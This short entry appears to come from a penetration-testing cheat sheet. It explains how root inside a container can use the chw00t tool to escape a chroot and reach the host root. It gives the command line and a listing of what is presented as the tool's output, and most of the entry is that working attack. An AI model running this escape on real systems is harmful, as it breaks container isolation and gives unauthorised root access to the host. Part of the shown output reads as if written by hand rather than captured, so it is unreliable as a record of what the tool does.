# Chw00t -break out to host root
# if you are running in a container as root (uid=0) you can use the Chw00t tool to break out by setting a new root directory.

chw00t -0 --dir newtmp
    [+] creating newtmp directory
    [+] chrooting to newtmp
    [+] change working directory to real root
    [+] chrooting to real root
    [+] changing working directory to newtmp
    [+] chrooted to newtmp
    [+] running shell in newtmp
    [+] you can now run commands as root in the newtmp directory
    [+] to exit, type 'exit' or press Ctrl+D

    